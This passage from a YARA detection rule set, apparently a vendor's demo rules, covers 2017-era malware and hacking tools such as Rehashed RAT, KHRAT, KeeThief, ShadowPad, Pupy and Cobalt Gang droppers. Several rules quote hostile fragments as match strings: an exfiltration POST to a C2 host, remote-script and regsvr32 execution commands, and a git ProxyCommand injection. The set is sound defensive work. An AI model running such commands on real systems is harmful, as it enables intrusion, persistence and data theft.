= \"%04d/%02d/%02d %02d:%02d:%02d - {%s}\" fullword wide\n      $s3 = \"wininet.dll    \" fullword ascii\n      $s4 = \"DMCZ0001.dat\" fullword ascii\n      $s5 = \"TZ0000001.dat\" fullword ascii\n      $s6 = \"\\\\MUT.dat\" ascii\n      $s7 = \"ouemm/emm!!!!!!!!!!!!!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 3 of them ) )\n}\n\nrule Rehashed_RAT_2_RID2C0C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Rehashed RAT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations\"\n      date = \"2017-09-08 09:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"49efab1dedc6fffe5a8f980688a5ebefce1be3d0d180d5dd035f02ce396c9966\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"dalat.dulichovietnam.net\" fullword ascii\n      $x2 = \"web.Thoitietvietnam.org\" fullword ascii\n      $a1 = \"User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64)\" fullword ascii\n      $a2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3\" ascii\n      $s1 = \"GET /%s%s%s%s HTTP/1.1\" fullword ascii\n      $s2 = \"http://%s:%d/%s%s%s%s\" fullword ascii\n      $s3 = \"{521338B8-3378-58F7-AFB9-E7D35E683BF8}\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"9c4c648f4a758cbbfe28c8850d82f931\" or ( 1 of ( $x* ) or 3 of them ) ) ) or ( 4 of them )\n}\n\nrule Rehashed_RAT_3_RID2C0D : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from Rehashed RAT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.fortinet.com/2017/09/05/rehashed-rat-used-in-apt-campaign-against-vietnamese-organizations\"\n      date = \"2017-09-08 09:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"9cebae97a067cd7c2be50d7fd8afe5e9cf935c11914a1ab5ff59e91c1e7e5fc4\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\BisonNewHNStubDll\\\\Release\\\\Goopdate.pdb\" ascii\n      $s2 = \"psisrndrx.ebd\" fullword wide\n      $s3 = \"pbad exception\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule KHRAT_Malware_RID2BB3 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an Imphash of KHRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n      date = \"2017-08-31 09:17:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"53e27fd13f26462a58fa5587ecd244cab4da23aa80cf0ed6eb5ee9f9de2688c1\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == \"6a8478ad861f98f8428a042f74de1944\"\n}\n\nrule MAL_KHRAT_script_RID2CB8 : DEMO MAL SCRIPT T1053_005 T1218_011 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file MAL_KHRAT_scritpt.js\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n      date = \"2017-08-31 10:01:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8c88b4177b59f4cac820b0019bcc7f6d3d50ce4badb689759ab0966780ae32e3\"\n      tags = \"DEMO, MAL, SCRIPT, T1053_005, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"CreateObject(\\\"WScript.Shell\\\").Run \\\"schtasks /create /sc MINUTE /tn\" ascii\n      $x2 = \"CreateObject(\\\"WScript.Shell\\\").Run \\\"rundll32.exe javascript:\\\"\\\"\\\\..\\\\mshtml,RunHTMLApplication\" ascii\n      $x3 = \"<registration progid=\\\"ff010f\\\" classid=\\\"{e934870c-b429-4d0d-acf1-eef338b92c4b}\\\" >\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule MAL_KHRAT_scritplet_RID2DFD : DEMO FILE MAL {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file MAL_KHRAT_scritplet_RID2DFD.sct\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/\"\n      date = \"2017-08-31 10:55:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cdb9104636a6f7c6018fe99bc18fb8b542689a84c23c10e9ea13d5aa275fd40e\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"http.open \\\"POST\\\", \\\"http://update.upload-dropbox[.]com/docs/tz/GetProcess.php\\\",False,\\\"\\\",\\\"\\\" \" fullword ascii\n      $x2 = \"Process=Process & Chr(32) & Chr(32) & Chr(32) & Obj.Description\" fullword ascii\n      $s1 = \"http.SetRequestHeader \\\"Content-Type\\\", \\\"application/json\\\" \" fullword ascii\n      $s2 = \"Dim http,WMI,Objs,Process\" fullword ascii\n      $s3 = \"Set Objs=WMI.InstancesOf(\\\"Win32_Process\\\")\" fullword ascii\n      $s4 = \"'WScript.Echo http.responseText \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x3f3c and filesize < 1KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule APT12_Malware_Aug17_RID2D65 : DEMO EXE FILE G0005 MAL {\n   meta:\n      description = \"Detects APT 12 Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.macnica.net/blog/2017/08/post-fb81.html\"\n      date = \"2017-08-30 10:30:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"dc7521c00ec2534cf494c0263ddf67ea4ba9915eb17bdc0b3ebe9e840ec63643\"\n      hash2 = \"42da51b69bd6625244921a4eef9a2a10153e012a3213e8e9877cf831aea3eced\"\n      tags = \"DEMO, EXE, FILE, G0005, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == \"9ba915fd04f248ad62e856c7238c0264\" )\n}\n\nrule KeeThief_PS_RID2B18 : DEMO FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects component of KeeTheft - KeePass dump tool - file KeeThief.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/HarmJ0y/KeeThief\"\n      date = \"2017-08-29 08:51:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a3b976279ded8e64b548c1d487212b46b03aaec02cb6e199ea620bd04b8de42f\"\n      tags = \"DEMO, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$WMIProcess = Get-WmiObject win32_process -Filter \\\"ProcessID = $($KeePassProcess.ID)\\\"\" fullword ascii\n      $x2 = \"if($KeePassProcess.FileVersion -match '^2\\\\.') {\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7223 and filesize < 1000KB and ( 1 of ( $x* ) ) )\n}\n\nrule KeeTheft_EXE_RID2B62 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects component of KeeTheft - KeePass dump tool - file KeeTheft.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/HarmJ0y/KeeThief\"\n      date = \"2017-08-29 09:04:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f06789c3e9fe93c165889799608e59dda6b10331b931601c2b5ae06ede41dc22\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error: Could not create a thread for the shellcode\" fullword wide\n      $x2 = \"Could not find address marker in shellcode\" fullword wide\n      $x3 = \"GenerateDecryptionShellCode\" fullword ascii\n      $x4 = \"KeePassLib.Keys.KcpPassword\" fullword wide\n      $x5 = \"************ Found a CompositeKey! **********\" fullword wide\n      $x6 = \"*** Interesting... there are multiple .NET runtimes loaded in KeePass\" fullword wide\n      $x7 = \"GetKcpPasswordInfo\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them )\n}\n\nrule KeeTheft_Out_Shellcode_RID2FAA : DEMO HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects component of KeeTheft - KeePass dump tool - file Out-Shellcode.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/HarmJ0y/KeeThief\"\n      date = \"2017-08-29 12:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2afb1c8c82363a0ae43cad9d448dd20bb7d2762aa5ed3672cd8e14dee568e16b\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Write-Host \\\"Shellcode length: 0x$(($ShellcodeLength + 1).ToString('X4'))\\\"\" fullword ascii\n      $x2 = \"$TextSectionInfo = @($MapContents | Where-Object { $_ -match '\\\\.text\\\\W+CODE' })[0]\" fullword ascii\n   condition: \n      ( filesize < 2KB and 1 of them )\n}\n\nrule Hacktool_PasswordsPro_RID2F9C : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file PasswordsPro.exe\"\n      author = \"Florian Roth\"\n      reference = \"PasswordPro\"\n      date = \"2017-08-27 12:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5b3d6654e6d9dc49ee1136c0c8e8122cb0d284562447abfdc05dfe38c79f95bf\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"No users marked for attack or all marked users already have passwords found!\" fullword ascii\n      $s2 = \"%s\\\\PasswordsPro.ini.Dictionaries(%d)\" fullword ascii\n      $s3 = \"Passwords processed since attack start:\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}\n\nrule PasswordPro_NTLM_DLL_RID2E6A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file NTLM.dll\"\n      author = \"Florian Roth\"\n      reference = \"PasswordPro\"\n      date = \"2017-08-27 11:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"47d4755d31bb96147e6230d8ea1ecc3065da8e557e8176435ccbcaea16fe50de\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"NTLM.dll\" fullword ascii\n      $s2 = \"Algorithm: NTLM\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and pe.exports ( \"GetHash\" ) and pe.exports ( \"GetInfo\" ) and ( all of them ) )\n}\n\nrule JavaScript_Run_Suspicious_RID3132 : DEMO SCRIPT T1059 {\n   meta:\n      description = \"Detects a suspicious Javascript Run command\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/craiu/status/900314063560998912\"\n      date = \"2017-08-23 13:12:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"w = new ActiveXObject(\" ascii\n      $s2 = \" w.Run(r);\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Datper_Backdoor_RID2CF5 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Datper Malware\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.jpcert.or.jp/2017/08/detecting-datper-malware-from-proxy-logs.html\"\n      date = \"2017-08-21 10:11:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7d70d659c421b50604ce3e0a1bf423ab7e54b9df361360933bac3bb852a31849\"\n      hash2 = \"331ac0965b50958db49b7794cc819b2945d7b5e5e919c185d83e997e205f107b\"\n      hash3 = \"90ac1fb148ded4f46949a5fea4cd8c65d4ea9585046d66459328a5866f8198b2\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"RtlGetCo\" fullword ascii\n      $s2 = \"hutils\" fullword ascii\n      $s3 = \"kza2FWU,f;\\\"3U&zpa3U(W`J\" fullword ascii\n      $c1 = \"dkkwldngn\" fullword ascii\n      $c2 = \"ndkkwqgcm\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"58db98e2334746d349d607e4d73bc5ea\" or pe.imphash ( ) == \"8fbed921458af485ce84fb7d9b13899e\" or ( 2 of ( $s* ) and 1 of ( $c* ) ) or ( $s3 and $c1 ) ) )\n}\n\nrule Suspicious_Script_Running_from_HTTP_RID350E : DEMO SCRIPT T1059 {\n   meta:\n      description = \"Detects a suspicious \"\n      author = \"Florian Roth\"\n      reference = \"https://www.hybrid-analysis.com/sample/a112274e109c5819d54aa8de89b0e707b243f4929a83e77439e3ff01ed218a35?environmentId=100\"\n      date = \"2017-08-20 15:56:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1059\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /C script:http://\" ascii nocase\n      $s2 = \"cmd /C script:https://\" ascii nocase\n      $s3 = \"cmd.exe /C script:http://\" ascii nocase\n      $s4 = \"cmd.exe /C script:https://\" ascii nocase\n   condition: \n      1 of them\n}\n\nrule Reflective_DLL_Loader_Aug17_1_RID317F : DEMO EXE FILE HKTL T1055_001 {\n   meta:\n      description = \"Detects Reflective DLL Loader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 13:25:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f2f85855914345eec629e6fc5333cf325a620531d1441313292924a88564e320\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055_001\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\reflective_dll.pdb\" ascii\n      $x2 = \"reflective_dll.x64.dll\" fullword ascii\n      $s3 = \"DLL Injection\" fullword ascii\n      $s4 = \"?ReflectiveLoader@@YA_KPEAX@Z\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"4bf489ae7d1e6575f5bb81ae4d10862f\" or pe.exports ( \"?ReflectiveLoader@@YA_KPEAX@Z\" ) or ( 1 of ( $x* ) or 2 of them ) ) ) or ( 2 of them )\n}\n\nrule DLL_Injector_Lynx_RID2D94 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Lynx DLL Injector\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 10:37:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d594f60e766e0c3261a599b385e3f686b159a992d19fa624fad8761776efa4f0\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \" -p <TARGET PROCESS NAME> | -u <DLL PAYLOAD> [--obfuscate]\" fullword wide\n      $x2 = \"You've selected to inject into process: %s\" fullword wide\n      $x3 = \"Lynx DLL Injector\" fullword wide\n      $x4 = \"Reflective DLL Injector\" fullword wide\n      $x5 = \"Failed write payload: %lu\" fullword wide\n      $x6 = \"Failed to start payload: %lu\" fullword wide\n      $x7 = \"Injecting payload...\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them ) or ( 3 of them )\n}\n\nrule Reflective_DLL_Loader_Aug17_2_RID3180 : DEMO EXE FILE HKTL T1055_001 {\n   meta:\n      description = \"Detects Reflective DLL Loader - suspicious - Possible FP could be program crack\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 13:25:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c2a7a2d0b05ad42386a2bedb780205b7c0af76fe9ee3d47bbe217562f627fcae\"\n      hash2 = \"b90831aaf8859e604283e5292158f08f100d4a2d4e1875ea1911750a6cb85fe0\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055_001\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"\\\\ReflectiveDLLInjection-master\\\\\" ascii\n      $s2 = \"reflective_dll.dll\" fullword ascii\n      $s3 = \"DLL injection\" fullword ascii\n      $s4 = \"_ReflectiveLoader@4\" ascii\n      $s5 = \"Reflective Dll Injection\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"59867122bcc8c959ad307ac2dd08af79\" or pe.exports ( \"_ReflectiveLoader@4\" ) or 2 of them ) ) or ( 3 of them )\n}\n\nrule Reflective_DLL_Loader_Aug17_3_RID3181 : DEMO EXE FILE HKTL T1055_001 {\n   meta:\n      description = \"Detects Reflective DLL Loader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 13:25:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"d10e4b3f1d00f4da391ac03872204dc6551d867684e0af2a4ef52055e771f474\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055_001\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\inject.pdb\" ascii\n      $s2 = \"!!! Failed to gather information on system processes! \" fullword ascii\n      $s3 = \"reflective_dll.dll\" fullword ascii\n      $s4 = \"[-] %s. Error=%d\" fullword ascii\n      $s5 = \"\\\\Start Menu\\\\Programs\\\\reflective_dll.dll\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"26ba48d3e3b964f75ff148b6679b42ec\" or 2 of them ) ) or ( 3 of them )\n}\n\nrule Reflective_DLL_Loader_Aug17_4_RID3182 : DEMO EXE FILE HKTL T1055_001 {\n   meta:\n      description = \"Detects Reflective DLL Loader\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-20 13:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"205b881701d3026d7e296570533e5380e7aaccaa343d71b6fcc60802528bdb74\"\n      hash2 = \"f76151646a0b94024761812cde1097ae2c6d455c28356a3db1f7905d3d9d6718\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1055_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<H1>&nbsp;>> >> >> Keylogger Installed - %s %s << << <<</H1>\" fullword ascii\n      $s1 = \"<H3> ----- Running Process ----- </H3>\" fullword ascii\n      $s2 = \"<H2>Operating system: %s<H2>\" fullword ascii\n      $s3 = \"<H2>System32 dir:  %s</H2>\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them )\n}\n\nrule ShadowPad_nssock2_RID2DAE : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malicious nssock2.dll from ShadowPad incident - file nssock2.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/shadowpad-in-corporate-networks/81432/\"\n      date = \"2017-08-15 10:42:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"462a02a8094e833fd456baf0a6d4e18bb7dab1a9f74d5f163a8334921a4ffde8\"\n      hash2 = \"c45116a22cf5695b618fcdf1002619e8544ba015d06b2e1dbf47982600c7545f\"\n      hash3 = \"696be784c67896b9239a8af0a167add72b1becd3ef98d03e99207a3d5734f6eb\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"c67de089f2009b21715744762fc484e8\" or pe.imphash ( ) == \"11522f7d4b2fc05acba8f534ca1b828a\" ) )\n}\n\nrule Pupy_Backdoor_RID2C43 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Pupy backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/n1nj4sec/pupy-binaries\"\n      date = \"2017-08-11 09:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ae93714203c7ab4ab73f2ad8364819d16644c7649ea04f483b46924bd5bc0153\"\n      hash2 = \"83380f351214c3bd2c8e62430f70f8f90d11c831695027f329af04806b9f8ea4\"\n      hash3 = \"90757c1ae9597bea39bb52a38fb3d497358a2499c92c7636d71b95ec973186cc\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"reflectively inject a dll into a process.\" fullword ascii\n      $x2 = \"ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid\" fullword ascii\n      $x3 = \"LD_PRELOAD=%s HOOK_EXIT=%d CLEANUP=%d exec %s 1>/dev/null 2>/dev/null\" fullword ascii\n      $x4 = \"reflective_inject_dll\" fullword ascii\n      $x5 = \"ld_preload_inject_dll\" fullword ascii\n      $x6 = \"get_pupy_config() -> string\" fullword ascii\n      $x7 = \"[INJECT] inject_dll. OpenProcess failed.\" fullword ascii\n      $x8 = \"reflective_inject_dll\" fullword ascii\n      $x9 = \"reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\" fullword ascii\n      $x10 = \"linux_inject_main\" fullword ascii\n   condition: \n      ( ( uint16 ( 0 ) == 0x457f or uint16 ( 0 ) == 0x5a4d ) and filesize < 7000KB and 1 of them ) or 3 of them or ( uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == \"84a69bce2ff6d9f866b7ae63bd70b163\" )\n}\n\nrule SUSP_PowerShell_Case_Anomaly_Aug17_RID33AF : ANOMALY DEMO OBFUS SCRIPT SUSP T1059 T1059_001 {\n   meta:\n      description = \"Detects obfuscated PowerShell hacktools\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/danielhbohannon/status/905096106924761088\"\n      date = \"2017-08-11 14:58:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-12-08\"\n      tags = \"ANOMALY, DEMO, OBFUS, SCRIPT, SUSP, T1059, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell\" nocase ascii wide\n      $sn1 = \"powershell\" ascii wide\n      $sn2 = \"Powershell\" ascii wide\n      $sn3 = \"PowerShell\" ascii wide\n      $sn4 = \"POWERSHELL\" ascii wide\n      $sn5 = \"powerShell\" ascii wide\n      $sn6 = \"PowerShelL\" ascii wide\n      $sn7 = \"PowershelL\" ascii wide\n      $a1 = \"wershell -e \" nocase wide ascii\n      $an1 = \"wershell -e \" wide ascii\n      $an2 = \"werShell -e \" wide ascii\n      $k1 = \"-noprofile\" fullword nocase ascii wide\n      $kn1 = \"-noprofile\" ascii wide\n      $kn2 = \"-NoProfile\" ascii wide\n      $kn3 = \"-noProfile\" ascii wide\n      $kn4 = \"-NOPROFILE\" ascii wide\n      $kn5 = \"-Noprofile\" ascii wide\n      $fp1 = \"Microsoft Code Signing\" ascii fullword\n      $fp2 = \"Microsoft Corporation\" ascii\n      $fp3 = \"Microsoft.Azure.Commands.ContainerInstance\" wide\n      $fp4 = \"# Localized PSGet.Resource.psd1\" wide\n   condition: \n      filesize < 800KB and ( ( #s1 > #sn1 + #sn2 + #sn3 + #sn4 + #sn5 + #sn6 + #sn7 ) or ( #a1 > #an1 + #an2 ) or ( #k1 > #kn1 + #kn2 + #kn3 + #kn4 + #kn5 ) ) and not 1 of ( $fp* )\n}\n\nrule git_CVE_2017_9800_poc_RID2D8C : CVE_2017_9800 DEMO SUSP {\n   meta:\n      description = \"Detects a CVE-2017-9800 exploitation attempt\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/mzbat/status/895811803325898753\"\n      date = \"2017-08-11 10:36:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2017_9800, DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"git clone ssh://-oProxyCommand=\" ascii\n      $s2 = \"git clone http://-\" ascii\n      $s3 = \"git clone https://-\" ascii\n   condition: \n      filesize < 200KB and 1 of them\n}\n\nrule CobaltStrike_CN_Group_BeaconDropper_Aug17_RID369B : CHINA COBALTSTRIKE DEMO G0080 MAL S0154 SCRIPT T1218_010 T1550_002 {\n   meta:\n      description = \"Detects Script Dropper of Cobalt Gang used in August 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-08-09 17:03:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"fc0fad39b461eb1cfc6be57932993fcea94fca650564271d1b74dd850c81602f\"\n      hash2 = \"1c845bb0f6b9a96404af97dcafdc77f1629246e840c01dd9f1580a341f554926\"\n      hash3 = \"6206e372870ea4f363be53557477f9748f1896831a0cdef3b8450a7fb65b86e1\"\n      tags = \"CHINA, COBALTSTRIKE, DEMO, G0080, MAL, S0154, SCRIPT, T1218_010, T1550_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"WriteLine(\\\"(new ActiveXObject('WScript.Shell')).Run('cmd /c c:/\" ascii\n      $x2 = \"WriteLine(\\\" (new ActiveXObject('WScript.Shell')).Run('regsvr32 /s\" ascii\n      $x3 = \"sh.Run(env('cmd /c set > %temp%\" ascii\n      $x4 = \"sh.Run('regsvr32 /s /u /i:\" ascii\n      $x5 = \".Get('Win32_ScheduledJob').Create('regsvr32 /s /u /i:\" ascii\n      $x6 = \"scrobj.dll','********\" ascii\n      $x7 = \"www.thyssenkrupp-marinesystems.org\" fullword ascii\n      $x8 = \"f.WriteLine(\\\" tLnk=env('%tmp%/'+lnkName+'.lnk');\\\");\" fullword ascii\n      $x9 = \"lnkName='office 365'; \" fullword ascii\n      $x10 = \";sh=x('WScript.Shell');\" ascii\n   condition: \n      ( filesize < 200KB and 1 of them )\n}\n\nrule CobaltGang_Malware_Aug17_1_RID307F : DEMO EXE FILE G0080 MAL {\n   meta:\n      description = \"Detects a Cobalt Gang malware\"\n      author = \"Florian Roth\"\n      reference = \"https://sslbl.abuse.ch/intel/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c\"\n      date = \"2017-08-09 12:42:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6d70673b723f338b3febc9f1d69463bdd4775539cb92b5a5d8fccc0d977fa2f0\"\n      tags = \"DEMO, EXE, FILE, G0080, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ServerSocket.EXE\" fullword wide\n      $s2 = \"Incorrect version of WS2_32.dll found\" fullword ascii\n      $s3 = \"Click 'Connect' to Connect to the Server.  'Disconnect' to disconnect from server.\" fullword wide\n      $s4 = \"Click 'Start' to start the Server.  'Stop' to Stop it.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 